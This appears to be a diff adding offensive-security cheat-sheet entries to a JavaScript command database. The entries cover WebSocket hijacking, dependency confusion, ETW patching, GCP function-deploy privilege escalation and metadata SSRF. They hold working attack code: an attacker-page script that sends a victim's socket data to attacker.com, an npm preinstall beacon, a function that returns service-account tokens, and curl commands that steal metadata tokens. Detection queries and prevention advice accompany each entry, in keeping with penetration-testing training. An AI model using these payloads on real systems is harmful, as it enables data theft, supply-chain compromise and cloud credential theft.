+      "notes": "=== WHY IT WORKS ===\n  The WebSocket handshake is an HTTP Upgrade request. Browsers attach cookies to it automatically and do NOT enforce the same-origin policy on WebSocket connections. If the server authenticates purely on the session cookie and ignores Origin (and there is no CSRF token in the handshake), any site can open an authenticated socket for the victim.\n\n=== DETECT ===\n  1. In Burp, find a WS handshake: GET /chat HTTP/1.1 ... Upgrade: websocket, with a session Cookie and an Origin header.\n  2. Check: does the server reject a changed/removed Origin? Is there a per-handshake CSRF token? If not, it is likely vulnerable.\n\n=== ATTACKER-PAGE PoC (exfil streamed data) ===\n  <script>\n    var ws = new WebSocket('wss://<target>/chat');\n    ws.onopen = () => ws.send('READY');\n    ws.onmessage = e => fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));\n  </script>\n  Host this on attacker.com; when the authenticated victim visits, their chat history / tokens stream to you.\n\n=== SEND PRIVILEGED COMMANDS ===\n  - If the socket accepts actions (ws.send JSON commands), issue state-changing messages as the victim.\n\n=== TOOLING ===\n  - Burp Repeater has a WebSockets tab (edit/replay frames).\n  - Burp 'Generate CSRF PoC' does not cover WS; hand-write the HTML PoC above.\n  - Test Origin handling by replaying the handshake with Origin: https://attacker.com in Repeater.",
+      "examples": [
+        {
+          "label": "Minimal exfil PoC on attacker page",
+          "command": "var ws=new WebSocket('wss://<target>/chat'); ws.onmessage=e=>fetch('https://attacker.com/?'+encodeURIComponent(e.data));"
+        },
+        {
+          "label": "Replay the handshake with a foreign Origin (Repeater)",
+          "command": "GET /chat HTTP/1.1  ...  Origin: https://attacker.com   Upgrade: websocket"
+        },
+        {
+          "label": "Request history over the hijacked socket",
+          "command": "ws.onopen = () => ws.send('{\"action\":\"getHistory\"}');"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - WebSockets security (CSWSH)",
+          "url": "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking"
+        },
+        {
+          "title": "OWASP - Testing WebSockets",
+          "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets"
+        },
+        {
+          "title": "RFC 6455 - The WebSocket Protocol (Origin)",
+          "url": "https://datatracker.ietf.org/doc/html/rfc6455#section-10.2"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cors-misconfiguration",
+          "note": "Same cross-origin trust-boundary failure, different transport.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-postmessage-exploitation",
+          "note": "Another client-side origin-validation flaw to test on the same SPA.",
+          "rel": "next"
+        },
+        {
+          "id": "xss-cookie-stealer",
+          "note": "Once a socket exfils data, cookie/session theft chains the same way.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Browsers attach cookies to the WebSocket Upgrade handshake and do not apply the same-origin policy to WS. A server that authenticates on the cookie alone, with no Origin check and no per-handshake CSRF token, accepts a socket opened by any cross-site page in the victim's authenticated context.",
+        "prerequisites": "A cookie-authenticated WebSocket endpoint that does not validate Origin and has no CSRF token in the handshake, plus a victim with an active session who visits the attacker's page.",
+        "impact": "Read access to all data the socket streams (chat, notifications, tokens) and the ability to send privileged actions as the victim - full session-scoped compromise over the socket.",
+        "detection": "[MITRE T1539] WebSocket Upgrade requests whose Origin header does not match an allowed origin (or is absent) yet carry a valid session cookie, and WS sessions originating from referrers outside the app.",
+        "artifacts": "Reverse-proxy/web access logs of the /ws or /chat Upgrade request (Origin, Cookie, Referer headers, Upgrade: websocket), and application WS session logs.",
+        "splunk_spl": "index=web (uri_path=\"/chat\" OR uri_path=\"/ws\")\n| rex field=_raw \"Upgrade:\\s*websocket\"\n| rex field=_raw \"Origin:\\s*(?<origin>\\S+)\"\n| where isnull(origin) OR NOT match(origin, \"^https://(www\\.)?<target>$\")\n| stats count by clientip, origin, uri_path",
+        "elastic_kql": "url.path:(\"/chat\" or \"/ws\") and http.request.headers.upgrade:\"websocket\" and not http.request.headers.origin:\"https://<target>\"",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem in (\"/chat\",\"/ws\")\n| extend origin = extract(@\"Origin:\\s*(\\S+)\", 1, csHeaders)\n| where isempty(origin) or origin !has \"<target>\"\n| summarize count() by cIP, origin",
+        "sigma_rules": "web_cross_site_websocket_hijacking_origin",
+        "prevention": "Validate the Origin header on the WebSocket handshake against a strict allow-list and reject mismatches. Add a per-handshake CSRF token (sent in the URL/subprotocol and verified server-side). Use SameSite cookies, short-lived tokens, and bind the socket to a token passed explicitly rather than ambient cookies.",
+        "sources": [
+          "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking",
+          "https://datatracker.ietf.org/doc/html/rfc6455#section-10.2"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "WebSocket handshake with foreign or missing Origin",
+            "logic": "index=web sourcetype=nginx (uri_path=\"/chat\" OR uri_path=\"/ws\")\n| rex field=_raw \"Upgrade:\\s*websocket\"\n| rex field=_raw \"Origin:\\s*(?<origin>\\S+)\"\n| where isnull(origin) OR NOT match(origin, \"^https://(www\\.)?<target>$\")\n| stats count by clientip, origin, uri_path",
+            "data_source": "nginx",
+            "attack": [
+              "T1539",
+              "T1190"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate native/mobile clients or server-to-server sockets that do not send a browser Origin.",
+            "tuning": "Allow-list expected origins and non-browser client fingerprints; alert on cookie-authenticated handshakes from unlisted origins."
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-exam-methodology",
       "name": "CRTP Exam Methodology & Playbook",
       "command": "# Flow: Setup/Recon -> Local PrivEsc -> Hunt DA session -> Domain Dominance -> Cross-Trust/Forest -> Document",
@@ -34562,6 +36513,113 @@ const COMMAND_DATA = {
       },
       "type": "command",
       "explain": "Looks up factory default credentials for a product:\n  creds search <product>   query the DefaultCreds-cheat-sheet database for that vendor/product's default user:pass pairs\nAlways try defaults against appliances, routers, databases, and web apps before brute forcing - they are often unchanged."
+    },
+    {
+      "id": "web-dependency-confusion",
+      "name": "Dependency Confusion (Public-Registry Name Squatting)",
+      "command": "npm publish --registry https://registry.npmjs.org --access public",
+      "description": "Supply-chain attack where a package name used only by an organization's INTERNAL registry is also published to the PUBLIC registry (npm/PyPI/RubyGems/etc.) with a higher version number. Build tooling that queries both registries and picks the highest version then pulls the attacker's package, executing attacker code (install scripts) inside the victim's build/CI. Covers name discovery, higher-version squatting, and exfil via install hooks.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Web",
+      "subcategory": "Supply Chain",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "Alex Birsan - Dependency Confusion research",
+      "tags": [
+        "dependency-confusion",
+        "supply-chain",
+        "npm",
+        "pypi",
+        "typosquatting",
+        "ci-cd"
+      ],
+      "mitre": [
+        "T1195.001",
+        "T1195.002"
+      ],
+      "exam": "lab-only",
+      "notes": "=== WHY IT WORKS ===\n  Package managers often resolve a name across BOTH an internal/private registry and the public registry, then install the HIGHEST version available. If an internal-only name is unregistered publicly, an attacker publishes it publicly with a huge version (e.g. 99.0.0) and the build pulls it.\n\n=== FIND INTERNAL NAMES ===\n  - Leaked package.json / requirements.txt / *.csproj / build logs in public repos, JS bundles, error pages, Docker images.\n  - Internal scoped names without a reserved public scope (@company/foo where the @company scope is unclaimed on npm).\n\n=== NPM PoC PACKAGE ===\n  package.json:\n    { \"name\": \"internal-logger\", \"version\": \"99.0.0\", \"scripts\": { \"preinstall\": \"node exfil.js\" } }\n  exfil.js sends hostname/env/whoami to a collaborator URL (DNS/HTTP out of the build network).\n  npm publish --registry https://registry.npmjs.org --access public\n\n=== PYPI ===\n  - setup.py with code in setup() runs on install; publish with a higher version than the internal one.\n  - twine upload dist/*\n\n=== SAFE PoC ===\n  - Use ONLY a canary beacon (hostname + a unique token to a Burp Collaborator / interactsh domain). Do not exfil secrets or run destructive code; this is lab-only / authorized research.\n\n=== DEFENDER NOTE ===\n  This is a supply-chain primitive; the 'attack' happens inside the victim's build, so detection lives in CI egress + registry policy, not web logs.",
+      "examples": [
+        {
+          "label": "npm install-hook beacon in package.json",
+          "command": "\"scripts\": { \"preinstall\": \"node -e \\\"require('https').get('https://<token>.oast.site/'+require('os').hostname())\\\"\" }"
+        },
+        {
+          "label": "Publish the squatting package to public npm",
+          "command": "npm publish --registry https://registry.npmjs.org --access public"
+        },
+        {
+          "label": "PyPI upload of a higher-version squat",
+          "command": "python3 -m twine upload dist/internal_pkg-99.0.0.tar.gz"
+        }
+      ],
+      "references": [
+        {
+          "title": "Alex Birsan - Dependency Confusion",
+          "url": "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
+        },
+        {
+          "title": "OWASP - Vulnerable and Outdated Components / Supply Chain",
+          "url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+        },
+        {
+          "title": "npm - Scopes and private packages",
+          "url": "https://docs.npmjs.com/cli/v10/using-npm/scope"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-pypi-supply-chain",
+          "note": "PyPI supply-chain abuse into a cloud build - same class in an AWS pipeline.",
+          "rel": "alternative"
+        },
+        {
+          "id": "aws-jenkins-pipeline-rce",
+          "note": "CI/CD pipeline RCE is the usual post-pull outcome.",
+          "rel": "next"
+        },
+        {
+          "id": "recon-trufflehog",
+          "note": "Secret/name discovery in public repos surfaces internal package names.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Package managers that query a public registry alongside a private one and select the highest semantic version will prefer an attacker's public package when an internal-only name is unclaimed publicly. Install-time scripts then execute in the build.",
+        "prerequisites": "An internal package name that is NOT reserved on the public registry, plus a build configuration that does not pin the registry/scope or lock hashes.",
+        "impact": "Arbitrary code execution inside CI/CD or developer machines, theft of build secrets and source, and a foothold for broader supply-chain compromise of shipped artifacts.",
+        "detection": "[MITRE T1195.001] CI build egress to package registries resolving internal names from the PUBLIC registry, install-script child processes spawning network/exec, and unexpected version jumps (e.g. 99.0.0) for internal packages.",
+        "artifacts": "CI/CD build logs (resolved registry URL and version per dependency), egress proxy logs from build runners, npm/pip audit output, and registry access logs showing public fetches of internal names.",
+        "splunk_spl": "index=proxy src_category=ci_runner (uri_host=\"registry.npmjs.org\" OR uri_host=\"pypi.org\")\n| rex field=uri_path \"/(?<pkg>[^/]+)\"\n| search pkg IN (internal_pkg_list)\n| stats count by src_ip, pkg, uri_host",
+        "elastic_kql": "destination.domain:(\"registry.npmjs.org\" or \"pypi.org\") and source.labels.role:\"ci-runner\" and url.path:*internal*",
+        "sentinel_kql": "CommonSecurityLog\n| where DeviceEventClassID == \"proxy\" and RequestURL has_any (\"registry.npmjs.org\",\"pypi.org\")\n| where SourceUserName == \"ci-runner\"\n| summarize count() by SourceIP, RequestURL",
+        "sigma_rules": "ci_dependency_confusion_public_fetch",
+        "prevention": "Reserve all internal package names/scopes on the public registries. Pin builds to the private registry only (scoped registry config, no public fallback), enforce lockfiles with integrity hashes, use .npmrc/pip index-url that forbids public resolution of internal names, and disable or sandbox install scripts (npm --ignore-scripts).",
+        "sources": [
+          "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610",
+          "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "CI runner fetching an internal package name from a public registry",
+            "logic": "index=proxy (uri_host=\"registry.npmjs.org\" OR uri_host=\"pypi.org\")\n| rex field=uri_path \"/(?<pkg>[a-zA-Z0-9@._-]+)\"\n| lookup internal_packages name AS pkg OUTPUT name AS is_internal\n| where isnotnull(is_internal)\n| stats count values(uri_path) by src_ip, pkg",
+            "data_source": "proxy",
+            "attack": [
+              "T1195.001",
+              "T1195.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "An internal name that is also a legitimate public package (verify ownership).",
+            "tuning": "Maintain a lookup of internal package names; alert only when a build runner resolves one against the public registry."
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m14-network-attack-detection",
@@ -46197,6 +48255,128 @@ const COMMAND_DATA = {
       "explain": "Finds world-writable files, a prime escalation vector:\n  find /                   search from root\n  -path /proc -prune -o    skip /proc to cut noise\n  -type f -perm -o+w       files with the world-writable bit set\n  2>/dev/null              discard permission errors\nA root-run script or cron target that is world-writable lets you inject a payload; the variation finds writable directories too."
     },
     {
+      "id": "win-etw-patching",
+      "name": "ETW Patching - Blind Event Tracing for Windows",
+      "command": "ntdll!EtwEventWrite in-process patch to return to caller",
+      "description": "Event Tracing for Windows (ETW) carries most host telemetry (AMSI, .NET CLR, PowerShell, Threat-Intelligence) that EDR consumes. Patching ntdll!EtwEventWrite in the current process so it returns immediately, or zeroing the managed EventProvider enabled field, blinds that in-process telemetry so loaders and offensive PowerShell run without generating events. Affects only the current process.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Defense Evasion",
+      "subcategory": "Defense Evasion",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1562.006 (Indicator Blocking); public ETW-tampering research",
+      "tags": [
+        "etw",
+        "evasion",
+        "impair-defenses",
+        "in-memory",
+        "ntdll",
+        "edr-evasion"
+      ],
+      "mitre": [
+        "T1562.006",
+        "T1562.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY ETW MATTERS ===\n  ETW is the transport. AMSI, Microsoft-Windows-DotNETRuntime, PowerShell script-block logging (4104)\n  and Microsoft-Windows-Threat-Intelligence (used by EDR) all flow over ETW providers. Breaking the\n  write path in your own process means those events never leave it.\n\n=== COMMON PATCH POINTS (in-process, current process only) ===\n  ntdll!EtwEventWrite        # classic single-function neutering\n  ntdll!EtwEventWriteFull    # secondary path some providers use\n  Managed: System.Diagnostics.Eventing.EventProvider enabled flag set to disabled via reflection\n\n=== SCOPE + LIMITS ===\n  - Only the current process is affected; a fresh process is logged again.\n  - Patching ntdll triggers an RWX/RX change on a loaded system module - a strong EDR signal in itself.\n  - Kernel-mode ETW-TI consumers (PPL EDR) are NOT silenced by a user-mode ntdll patch.\n\n=== TYPICAL CHAIN ===\n  1. Patch ETW in the loader process.\n  2. Patch/neuter AMSI in the same process.\n  3. Load the in-memory tool (execute-assembly / reflective DLL).\n\n=== ALTERNATIVES ===\n  AMSI bypass (script scanning), provider-level disable via logman/wevtutil (loud, needs admin),\n  moving work to a sacrificial process.",
+      "examples": [
+        {
+          "label": "Confirm ETW/AMSI telemetry is live before testing a bypass (defender view)",
+          "command": "logman query -ets"
+        },
+        {
+          "label": "List the .NET runtime ETW provider a loader would blind",
+          "command": "logman query providers | findstr /i DotNETRuntime"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1562.006 - Impair Defenses: Indicator Blocking",
+          "url": "https://attack.mitre.org/techniques/T1562/006/"
+        },
+        {
+          "title": "Microsoft - About Event Tracing",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "amsi-bypass",
+          "note": "Pair ETW patching with an AMSI bypass in the same process.",
+          "rel": "alternative"
+        },
+        {
+          "id": "win-clr-execute-assembly",
+          "note": "In-memory .NET loading is the payload ETW patching protects.",
+          "rel": "next"
+        },
+        {
+          "id": "av-evasion-methods",
+          "note": "Where ETW blinding fits in the detection picture.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ETW providers write events through a small set of ntdll stubs. Because the provider state and the write stub live in the attacker-controlled process, user-mode code can overwrite the stub or flip the enabled flag so events are dropped before they reach any consumer. The telemetry simply stops without any error surfaced to the SIEM.",
+        "prerequisites": "Code execution in the process whose telemetry is being blinded. No admin required for a user-mode in-process patch. Kernel ETW-TI consumed by a PPL EDR is not affected by a user-mode patch.",
+        "impact": "T1562.006 Indicator Blocking. Suppresses AMSI, .NET, PowerShell, and TI events for the current process, letting in-memory offensive tooling run without generating the events detections rely on.",
+        "detection": "The suppression itself is near-silent, so detect the surrounding behaviour: a sudden stop in expected ETW/4104 volume from a process that is still running; RWX or RX protection changes on ntdll in a non-system process (Sysmon EID 10 targeting ntdll); image loads of amsi.dll/clr.dll followed by telemetry silence. EDR sensors using kernel ETW-TI still observe the activity the user-mode patch hid.",
+        "artifacts": "Sysmon EID 10 (ProcessAccess) with GrantedAccess including write to a process holding ntdll; Sysmon EID 7 (ImageLoad) of clr.dll/amsi.dll; a gap in Microsoft-Windows-PowerShell/4104 for an interactive session; EDR memory-integrity alerts on modified ntdll pages.",
+        "splunk_spl": "index=sysmon EventCode=10 TargetImage=\"*ntdll.dll*\" GrantedAccess IN (\"0x1F0FFF\",\"0x1FFFFF\")\n| stats count by SourceImage, TargetImage, GrantedAccess, Computer",
+        "elastic_kql": "event.code:\"10\" and winlog.event_data.TargetImage:*ntdll.dll* and winlog.event_data.GrantedAccess:(\"0x1F0FFF\" or \"0x1FFFFF\")",
+        "sentinel_kql": "DeviceEvents\n| where ActionType in (\"ReadProcessMemory\",\"WriteToLsassProcessMemory\",\"NtProtectVirtualMemory\")\n| where InitiatingProcessFileName !in (\"MsMpEng.exe\",\"services.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, ActionType, AdditionalFields",
+        "sigma_rules": "proc_access_ntdll_etw_patch_rwx",
+        "prevention": "Prefer EDR that consumes kernel ETW-TI (unaffected by user-mode ntdll patches); run security sensors as Protected Process Light; enforce Attack Surface Reduction and WDAC to limit unsigned loaders; alert on protection changes to ntdll; baseline expected 4104/.NET event volume per host so silence is itself an alert.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1562/006/",
+          "https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Memory protection change on ntdll in a non-system process",
+            "logic": "index=sysmon EventCode=10 TargetImage=\"*ntdll.dll*\" GrantedAccess IN (\"0x1F0FFF\",\"0x1FFFFF\")\n| stats count by SourceImage, TargetImage, GrantedAccess, Computer",
+            "data_source": "sysmon",
+            "attack": [
+              "T1562.006"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Debuggers, profilers, and some AV engines access ntdll with broad rights",
+            "tuning": "Allowlist known debuggers/EDR agents; alert on unsigned or newly-seen SourceImage"
+          },
+          {
+            "platform": "sentinel",
+            "name": "PowerShell/.NET telemetry silence after image load",
+            "logic": "DeviceImageLoadEvents\n| where FileName in~ (\"amsi.dll\",\"clr.dll\")\n| join kind=leftanti (DeviceEvents | where ActionType == \"PowerShellCommand\") on DeviceName\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1562.006",
+              "T1562.001"
+            ],
+            "fidelity": "telemetry",
+            "confidence": "low",
+            "false_positives": "Short-lived .NET processes that legitimately emit no script events",
+            "tuning": "Correlate with a per-host 4104 baseline; raise only on interactive sessions"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "defender-endpoint"
+          ],
+          "better_with": [
+            "edr",
+            "etw"
+          ]
+        }
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -53382,6 +55562,110 @@ const COMMAND_DATA = {
       "explain": "Authenticates to Google Cloud as a compromised service account:\n  gcloud auth activate-service-account   log in as an SA\n  --key-file <sa_key>.json               the SA's JSON key\nEstablishes the gcloud session for all GCP operations; 'gcloud auth login' handles user OAuth, and 'gcloud auth list'/'config list' confirm the active identity and project."
     },
     {
+      "id": "gcp-cloudfunction-deploy-privesc",
+      "name": "GCP Cloud Function/Run Deploy Privesc - actAs a Privileged SA",
+      "command": "gcloud functions deploy <profile> --runtime python312 --trigger-http --service-account <target>",
+      "description": "Escalate privileges in GCP by deploying (or updating) a Cloud Function or Cloud Run service with a more privileged service account attached, then triggering it to read that SA's access token from the metadata server. Requires cloudfunctions.functions.create/update (or run.services.create) plus iam.serviceAccounts.actAs over the target SA - a classic actAs privilege-escalation path.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "GCP Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "Rhino Security Labs / GCP docs",
+      "tags": [
+        "gcp",
+        "cloud-functions",
+        "cloud-run",
+        "actas",
+        "service-account",
+        "privesc",
+        "metadata"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1651"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\n  Deploy code that runs AS a privileged SA (you attach it with --service-account,\n  which requires actAs on that SA). The function reads its own SA token from\n  the metadata server and returns it to you.\n\n=== PERMISSIONS ===\n  cloudfunctions.functions.create/update (or run.services.create/update)\n  + iam.serviceAccounts.actAs over the target SA\n  + cloudfunctions.functions.call / an HTTP trigger to invoke it.\n\n=== ENUMERATE SAs YOU CAN actAs ===\n  gcloud iam service-accounts list\n  gcloud projects get-iam-policy <project> --format=json  # find actAs/SA User\n\n=== PAYLOAD (main.py) - leak the attached SA token ===\n  cat > main.py <<'EOF'\nimport urllib.request\ndef pwn(request):\n    url='http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n    req=urllib.request.Request(url, headers={'Metadata-Flavor':'Google'})\n    return urllib.request.urlopen(req).read()\nEOF\n  echo 'functions-framework' > requirements.txt\n\n=== DEPLOY WITH THE PRIVILEGED SA ATTACHED ===\n  gcloud functions deploy <profile> --runtime python312 --trigger-http \\\n    --entry-point pwn --allow-unauthenticated \\\n    --service-account <target> --source .\n\n=== TRIGGER + READ THE TOKEN ===\n  curl \"$(gcloud functions describe <profile> --format='value(httpsTrigger.url)')\"\n  # the returned access_token belongs to <target>; use it:\n  curl -H \"Authorization: Bearer <token>\" \\\n    https://cloudresourcemanager.googleapis.com/v1/projects/<project>\n\n=== CLOUD RUN VARIANT ===\n  gcloud run deploy <profile> --image <img> --service-account <target> --allow-unauthenticated\n\n=== CLEANUP ===\n  gcloud functions delete <profile>",
+      "examples": [
+        {
+          "label": "Deploy a function running as a privileged SA",
+          "command": "gcloud functions deploy <profile> --runtime python312 --trigger-http --entry-point pwn --service-account <target> --source ."
+        },
+        {
+          "label": "Trigger and read the SA token",
+          "command": "curl \"$(gcloud functions describe <profile> --format='value(httpsTrigger.url)')\""
+        },
+        {
+          "label": "Cloud Run variant",
+          "command": "gcloud run deploy <profile> --image <img> --service-account <target> --allow-unauthenticated"
+        }
+      ],
+      "references": [
+        {
+          "title": "Rhino Security Labs - GCP privilege escalation (part 2)",
+          "url": "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
+        },
+        {
+          "title": "GCP docs - Cloud Functions identity (per-function SA)",
+          "url": "https://cloud.google.com/functions/docs/securing/function-identity"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-sa-impersonation",
+          "note": "Direct impersonation is the related actAs primitive.",
+          "rel": "alternative"
+        },
+        {
+          "id": "gcp-metadata-token",
+          "note": "The function reads the SA token from the metadata server.",
+          "rel": "next"
+        },
+        {
+          "id": "gcp-iam-privesc",
+          "note": "Catalogue of GCP IAM privesc including deploy paths.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Attaching a service account to a Cloud Function/Run service is a normal deploy option gated by iam.serviceAccounts.actAs. Code deployed this way runs as the attached SA and can read that SA's token from the metadata server, so deploy rights plus actAs over a privileged SA equal that SA's permissions.",
+        "prerequisites": "cloudfunctions.functions.create/update (or run.services.create/update), iam.serviceAccounts.actAs over the target SA, and the ability to invoke the deployed service.",
+        "impact": "Privilege escalation to the attached SA's roles (often far broader than the attacker's own), token theft, and persistence via a long-lived deployed service.",
+        "detection": "[MITRE T1651] Cloud Audit Logs CreateFunction/UpdateFunction or run.services.create with a serviceAccountEmail the deployer does not own, paired with iam.serviceAccounts.actAs; new unauthenticated/HTTP-triggered functions; the attached SA's token used from outside GCP.",
+        "artifacts": "Audit log google.cloud.functions.v1.CloudFunctionsService.CreateFunction/UpdateFunction (or Cloud Run services.create) with request.function.serviceAccountEmail; actAs authorization entries; subsequent API calls by the target SA from unusual IPs.",
+        "splunk_spl": "index=gcp (protoPayload.methodName=\"*CreateFunction*\" OR protoPayload.methodName=\"*UpdateFunction*\" OR protoPayload.methodName=\"*run.services.create*\")\n| stats count by protoPayload.authenticationInfo.principalEmail, protoPayload.request.function.serviceAccountEmail",
+        "elastic_kql": "gcp.audit.method_name:(*CreateFunction* or *UpdateFunction* or *services.create*) and gcp.audit.service_name:(cloudfunctions.googleapis.com or run.googleapis.com)",
+        "sentinel_kql": "GCPAuditLogs\n| where MethodName has_any (\"CreateFunction\",\"UpdateFunction\",\"services.create\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+        "sigma_rules": "gcp_function_deploy_actas_privesc",
+        "prevention": "Restrict iam.serviceAccounts.actAs and the per-function/Run default SA; grant deployed services least-privilege SAs, never the default Compute SA with Editor; require authenticated invocation (no --allow-unauthenticated); use Organization Policy to constrain allowed SAs; alert on deploys that attach an SA the deployer does not control.",
+        "sources": [
+          "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/",
+          "https://cloud.google.com/functions/docs/securing/function-identity"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Function/Run deploy attaching a privileged service account",
+            "logic": "GCPAuditLogs\n| where ServiceName in (\"cloudfunctions.googleapis.com\",\"run.googleapis.com\")\n| where MethodName has_any (\"CreateFunction\",\"UpdateFunction\",\"services.create\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+            "data_source": "gcp-audit",
+            "attack": [
+              "T1651",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate CI/CD deploying functions/services with dedicated SAs",
+            "tuning": "Allowlist deploy pipelines and the SAs they legitimately attach; alert when a principal attaches an SA it does not own or deploys unauthenticated endpoints"
+          }
+        ]
+      }
+    },
+    {
       "id": "gcp-storage-exfil",
       "name": "GCP Cloud Storage Enumeration & Exfiltration",
       "command": "gcloud storage ls gs://<bucket> --access-token-file token.txt",
@@ -53558,6 +55842,110 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Enumerates and pulls objects from Cloud Storage buckets:\n  gcloud storage ls gs://<bucket>   list a bucket's contents\n  --access-token-file token.txt     authenticate with a stolen OAuth token (or use an activated SA)\nBuckets often hold SA key files, .env, terraform state, and backups; 'gcloud storage cp' downloads them, and a recovered SA key frequently unlocks a more privileged identity."
+    },
+    {
+      "id": "gcp-compute-metadata-ssrf",
+      "name": "GCP Compute Metadata SSRF - Steal SA Access Tokens",
+      "command": "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "description": "Abuse an SSRF primitive (or a shell) on a GCP Compute Engine / GKE / Cloud Run instance to query metadata.google.internal and steal the attached service account's OAuth access token. GCP requires the header Metadata-Flavor: Google (and rejects X-Forwarded-For), so a usable SSRF must set custom headers; the stolen token grants the SA's permissions until it expires.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "GCP Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "hackingthe.cloud / GCP docs",
+      "tags": [
+        "gcp",
+        "metadata",
+        "ssrf",
+        "service-account",
+        "token",
+        "compute-engine",
+        "169.254.169.254"
+      ],
+      "mitre": [
+        "T1552.005",
+        "T1078.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE TARGET ===\n  metadata.google.internal (169.254.169.254) serves the attached SA's token.\n  MANDATORY header: Metadata-Flavor: Google (no header = refused). This is\n  what makes GCP SSRF harder than AWS IMDSv1.\n\n=== STEAL THE SA TOKEN (direct / shell) ===\n  curl -s -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n  # -> {\"access_token\":\"ya29...\",\"expires_in\":...,\"token_type\":\"Bearer\"}\n\n=== USEFUL METADATA PATHS ===\n  .../default/email       # which SA is attached\n  .../default/scopes      # OAuth scopes\n  .../v1/project/project-id\n  .../v1/instance/attributes/   # startup-script, ssh-keys, custom attrs\n  # recursive dump:\n  curl -s -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'\n\n=== USE THE STOLEN TOKEN ===\n  TOKEN=ya29...\n  curl -H \"Authorization: Bearer $TOKEN\" \\\n    'https://storage.googleapis.com/storage/v1/b?project=<project>'\n  gcloud config set auth/access_token_file <hash_file>   # or use via REST\n\n=== SSRF DELIVERY (web app that fetches a URL) ===\n  Need to force the Metadata-Flavor header: gopher://, header-injection,\n  or an app that forwards custom headers. v0.1/v1beta1 legacy endpoints\n  did NOT require the header on old images.\n\n=== NEXT ===\n  Token -> enumerate project with the SA; pivot to impersonation / deploy.",
+      "examples": [
+        {
+          "label": "Steal the attached SA access token",
+          "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'"
+        },
+        {
+          "label": "Recursive metadata dump (startup script, keys)",
+          "command": "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'"
+        },
+        {
+          "label": "Use the token against Cloud Storage",
+          "command": "curl -H 'Authorization: Bearer <token>' 'https://storage.googleapis.com/storage/v1/b?project=<project>'"
+        }
+      ],
+      "references": [
+        {
+          "title": "hackingthe.cloud - GCP metadata SSRF",
+          "url": "https://hackingthe.cloud/gcp/general-knowledge/gcp-metadata-ssrf/"
+        },
+        {
